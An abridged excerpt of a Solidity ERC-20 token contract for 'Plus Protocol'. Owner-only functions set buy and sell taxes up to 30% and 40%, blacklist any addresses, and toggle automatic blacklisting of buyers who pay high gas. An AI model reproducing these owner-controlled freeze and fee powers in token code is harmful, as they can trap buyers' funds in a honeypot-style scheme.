...
/*
Socials:
https://t.me/PlusProtocolETH
https://twitter.com/PLUSPROTOCOLETH
*/
...
contract PLUS is Context, IERC20, Ownable {
    ...
    string private _name = "Plus Protocol";
    string private _symbol = "$PLUS";
    uint8 private _decimals = 9;

    address payable private MarketingWallet = payable(0x6242C215fdA3491F400ae9EdcF91B41120d8CFDb); // Marketing Address
    address payable private TeamWallet = payable(0x6242C215fdA3491F400ae9EdcF91B41120d8CFDb); // Buy Back Address
    ...
    uint256 private _totalSupply = 100 *  10**5 * 10**_decimals;
    uint256 public _maxTxAmount = _totalSupply.div(25); 
    uint256 public _walletMax = _totalSupply.div(25);
    ...
    bool private GweiBL = false; //Auto gw bl on
    uint256 public endtime = 5; //set the end time
    uint256 private feeTXtime;
    uint256 private GWEI = 10 * 1 gwei; //set the gwei
    ...
    function ManageBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        require(newLiquidityTax + newMarketingTax + newTeamTax <= 30, "Must keep buy taxes below 30%");
    ...
    function ManageSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        require(newLiquidityTax + newMarketingTax + newTeamTax <= 40, "Must keep sell taxes below 40%");
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is Declined');
        ...
        else
        {
            ...
            if (tx.gasprice >= GWEI && recipient != uniswapPair && GweiBL) {
            isBlacklisted[recipient] = true;
        }
            return true;
        }
    ...
    //manage blacklists
    function blacklist_addresses(address[] calldata addresses, bool status) public onlyOwner {
    ...
    function EndTime1m() external onlyOwner{
        endtime = block.timestamp + 60;
    }

    function UpdateGweiBL (uint256 _GW, bool _GweiBL) public onlyOwner {
               GWEI = _GW * 1 gwei; 
               GweiBL = _GweiBL;
    }
}